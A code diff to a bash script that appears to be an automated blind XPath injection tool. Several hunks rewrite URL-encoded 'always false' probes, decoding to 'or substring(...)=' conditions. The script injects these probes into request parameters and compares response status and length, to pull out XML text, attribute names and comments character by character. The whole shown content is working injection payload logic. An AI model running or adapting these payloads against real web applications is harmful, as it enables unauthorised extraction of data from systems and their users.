@@ -1864,7 +1864,7 @@ if [[ "$success" == "1" ]] ; then
 		icount=1
 		while [[ $icount -le $length ]] ; do
 		#always false:                                           
-		badparams=`echo "$cleanoutput" | replace "$payload" "$begin%20%6f%72%20%73%75%62%73%74%72%69%6e%67%28$obuff%2f%74%65%78%74%28%29%2c$icount%2c%31%29%3d%27%27$end"`
+		badparams=`echo "$cleanoutput" | replace "$payload" "$begin%20%6f%72%20%73%75%62%73%74%72%69%6e%67%28$obuff%2f%74%65%78%74%28%29%2c0%2c%31%29%3d%27a%27$end"`
 		requester
 		status_false=`echo $response | cut -d ":" -f 1`
 		length_false=`echo $response | cut -d ":" -f 2`			
@@ -1983,7 +1983,7 @@ while [[ $attgcount -le $maxxcount ]] ; do
 			echo -n " " >> ./listofxpathelements.txt
 			atticount=1
 			#always false:                                           
-			badparams=`echo "$cleanoutput" | replace "$payload" "$begin%20%6f%72%20%73%75%62%73%74%72%69%6e%67%28%6e%61%6d%65%28$obuff%2f%40%2a%5b$battcount%5d%29%2c$atticount%2c%31%29%3d%27%27$end"`
+			badparams=`echo "$cleanoutput" | replace "$payload" "$begin%20%6f%72%20%73%75%62%73%74%72%69%6e%67%28%6e%61%6d%65%28$obuff%2f%40%2a%5b$battcount%5d%29%2c0%2c%31%29%3d%27a%27$end"`
 			requester
 			status_false=`echo $response | cut -d ":" -f 1`
 			length_false=`echo $response | cut -d ":" -f 2`
@@ -2048,7 +2048,7 @@ while [[ $attgcount -le $maxxcount ]] ; do
 			#stringextract=0
 			bicount=1
 			#always false:                                           
-			badparams=`echo "$cleanoutput" | replace "$payload" "$begin%20%6f%72%20%73%75%62%73%74%72%69%6e%67%28$obuff%2f%40%2a%5b$battcount%5d%2c$bicount%2c%31%29%3d%27%27$end"`
+			badparams=`echo "$cleanoutput" | replace "$payload" "$begin%20%6f%72%20%73%75%62%73%74%72%69%6e%67%28$obuff%2f%40%2a%5b$battcount%5d%2c0%2c%31%29%3d%27a%27$end"`
 			requester
 			status_false=`echo $response | cut -d ":" -f 1`
 			length_false=`echo $response | cut -d ":" -f 2`
@@ -2160,7 +2160,7 @@ if [[ "$stringextract" == "1" ]] ; then
 	while [[ "$comicount" -le "$comlen" ]] ; do
 		for char in `cat ./payloads/alphabet.txt` ; do
 			#always false:                                           
-			badparams=`echo "$cleanoutput" | replace "$payload" "$begin%20%6f%72%20%73%75%62%73%74%72%69%6e%67%28$obuff%2f%63%6f%6d%6d%65%6e%74%28%29%2c$comicount%2c%31%29%3d%27%27$end"`			
+			badparams=`echo "$cleanoutput" | replace "$payload" "$begin%20%6f%72%20%73%75%62%73%74%72%69%6e%67%28$obuff%2f%63%6f%6d%6d%65%6e%74%28%29%2c0%2c%31%29%3d%27a%27$end"`			
 			requester
 			status_false=`echo $response | cut -d ":" -f 1`
 			length_false=`echo $response | cut -d ":" -f 2`
